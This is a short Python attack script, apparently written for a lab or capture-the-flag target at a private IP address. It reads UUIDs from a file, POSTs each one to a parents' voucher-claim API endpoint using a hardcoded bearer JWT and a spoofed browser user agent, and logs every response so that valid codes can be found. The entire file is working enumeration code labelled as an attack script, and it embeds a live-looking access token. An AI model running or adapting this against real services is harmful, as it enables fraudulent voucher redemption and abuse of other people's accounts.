#!/usr/bin/env python3
import requests
import json
import time

##############################################
#               CONFIG BLOCK
##############################################

# === Base configuration ===
BASE_URL = "http://10.66.170.143"       # Change dynamically
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEwLCJyb2xlIjoxLCJleHAiOjE3NjUwNjIwNzB9.8niFSOupUEIUyZhdQPieqwEXGU4msEqxvfn1scZxXGE"            # Dynamic token
UUID_LIST_FILE = "uuid_list.txt"             # Path to UUID list file
REQUEST_DELAY = 0.1                     # Delay between requests

# === Endpoint configuration ===
ENDPOINT = "/api/parents/vouchers/claim"

# === Output configuration ===
LOG_FILE = "output_log.json"             # JSON log file


##############################################
#           HEADER + BODY TEMPLATES
##############################################

# You can modify these any time without touching the main logic
HEADERS = {
    "Authorization": f"Bearer {TOKEN}",
    "Accept-Language": "en-GB,en;q=0.9",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "*/*",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/",
    "Connection": "keep-alive"
}

# Body template for POST request (UUID will be inserted dynamically)
def build_body(uuid_value):
    return {
        "code": uuid_value
    }


##############################################
#           MAIN ATTACK SCRIPT
##############################################

def send_request(uuid_value):
    """
    Sends the POST request with the given UUID and logs the result.
    """
    url = BASE_URL + ENDPOINT
    body = build_body(uuid_value)

    try:
        response = requests.post(url, headers=HEADERS, json=body, timeout=10)

        # Print short output to terminal
        short_preview = response.text[:120].replace("\n", "")
        print(f"[{response.status_code}] UUID={uuid_value} → {short_preview}")

        # Build JSON log entry
        log_entry = {
            "uuid": uuid_value,
            "status": response.status_code,
            "response": response.text
        }

        # Append to log file
        with open(LOG_FILE, "a") as logf:
            logf.write(json.dumps(log_entry) + "\n")

    except Exception as e:
        print(f"[ERROR] UUID={uuid_value} → {e}")


def main():
    # Load UUID list from file
    with open(UUID_LIST_FILE, "r") as f:
        uuid_list = [line.strip() for line in f if line.strip()]

    print(f"Loaded {len(uuid_list)} UUIDs from {UUID_LIST_FILE}")

    for uuid_value in uuid_list:
        send_request(uuid_value)
        time.sleep(REQUEST_DELAY)


if __name__ == "__main__":
    main()
